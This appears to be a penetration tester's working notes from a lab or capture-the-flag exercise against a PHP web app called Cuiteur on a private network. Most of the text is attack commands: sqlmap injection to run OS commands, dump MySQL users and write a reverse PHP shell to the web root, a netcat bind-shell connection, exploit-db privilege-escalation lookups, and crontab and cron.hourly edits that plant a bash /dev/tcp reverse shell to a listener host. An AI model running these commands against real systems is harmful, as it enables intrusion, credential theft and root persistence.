# Golf notes

- Cuiteur
- 10.128.161.64
- command (with updated cookie, syrenka102 kurczak):
```bash
sqlmap -u http://10.128.161.27/php/recherche_old.php --level=3 --risk=2 --random-agent \
--cookie="PHPSESSID=fu16cuef906iq8trkb6rq7p0a0" --os-cmd "php reverse-php.php" --text-only --forms
```

```bash
php php-bind.php
```

- bind shell on port 4444:

```bash
nc 10.128.161.77 4444
```

- <https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf>

```bash
ps aux | grep "mysql"
```
- mysql is running on user mysql

```bash
ps aux | grep "root" 
```

- this process works on root

```text
root          12  0.0  0.0  58644 17980 ?        Ss   Sep12   3:18 /usr/bin/python /usr/bin/supervisord -c /etc/supervisor/supervisord.conf
```

```bash
sqlmap -u http://10.128.161.64/php/recherche_old.php --level=3 --risk=2 --random-agent --cookie="PHPSESSID=0s5l76j1jtso5e0eisj41ir2a2" -D mysql -T user --dump --text-only --forms 
```

```bash
sqlmap -u http://10.128.161.64/php/recherche_old.php --level=3 --risk=2 --random-agent --cookie="PHPSESSID=0s5l76j1jtso5e0eisj41ir2a2" --sql-shell --text-only --forms 
```

- you can't login to mysql using root beacuse you need to be root on that machine

```bash
wget http://10.128.161.2:10001/linuxprivchecker.py
```

- the highest chance is by exploit id 1518

```bash
searchsploit -p 1518
```

```bash
sqlmap -u http://10.128.161.64/php/recherche_old.php --level=3 --risk=2 --random-agent --cookie="PHPSESSID=0s5l76j1jtso5e0eisj41ir2a2" --file-write 1518.so --file-dest='/var/www/html/php/1518.so' --text-only --forms
```

```bash
g++ 1518.c -o 1518
```

```text
g++: error trying to exec 'cc1plus': execvp: No such file or directory
```

```test
[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...

    Note: Exploits relying on a compile/scripting language not detected on this system are marked with a '**' but should still be tested!

    The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system
    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c

    The following exploits are applicable to this kernel version and should be investigated as well
    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c
    - Kernel ia32syscall Emulation Privilege Escalation || http://www.exploit-db.com/exploits/15023 || Language=c
    - CAP_SYS_ADMIN to root Exploit || http://www.exploit-db.com/exploits/15916 || Language=c
    - CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit) || http://www.exploit-db.com/exploits/15944 || Language=c
    - Sendpage Local Privilege Escalation || http://www.exploit-db.com/exploits/19933 || Language=ruby**
    - open-time Capability file_ns_capable() - Privilege Escalation Vulnerability || http://www.exploit-db.com/exploits/25307 || Language=c
    - open-time Capability file_ns_capable() Privilege Escalation || http://www.exploit-db.com/exploits/25450 || Language=c
```
- first exploit probably not exploitable since root hash is broken and I can't log in 
- but all the other exploits are linux kernel exploits

*D36785F240A75C0312C97793F184EF4860B9FD0D
- sha-1 hash

```bash
sqlmap -u http://10.128.161.64/php/recherche_old.php --level=3 --risk=2 --random-agent --cookie="PHPSESSID=0s5l76j1jtso5e0eisj41ir2a2" --sql-shell --text-only --forms 
```

can't change the password

```bash
echo "# Saveable" >> /etc/crontabs/root
```
```bash
sqlmap -u http://10.128.161.27/php/recherche_old.php --level=3 --risk=2 --random-agent --cookie="PHPSESSID=dd1g8gogufuk74cbgf3u2574s0" --file-write reverse-php.php --file-dest='/var/www/html/php/reverse-php.php' --text-only --forms
```

```bash
python3 put-file.py /etc/crontab "* * * * * root /tmp/cron-task.sh"
```
```bash
php put-file.php /etc/crontab "* * * * * root /tmp/cron-task.sh"
```

Summary:
- I used the enumeration script from hint, it showed me a mysql vulnerability and some kernel-level exploits, which we can't use
- there is a vulnerable MySQL server, but to exploit it I would need the root access to database
- root is impossible to log in since it doesn't have hash
- I can't crack the hash for cuiteur and I'm not sure if it has permissions
- `--sql-shell` param in `sqlmap` allow me to enter database as `cuiteur`, but it doesn't allow me to modify data, only read
- `cron` is running in privileged context but I can't modify either `cron.d` directory or `cron*` files
- neither x

```bash
echo "bash -i >& /dev/tcp/10.128.161.2/10002" > /etc/cron.hourly/cuiteur-cleaning
```

```bash
sed -i '$s/.*/bash -i >& /dev/tcp/10.128.161.2/10002/' /etc/cron.hourly/cuiteur-cleaning
```

```bash
./neuromancer_easy "$(python3 exploit.py)"
```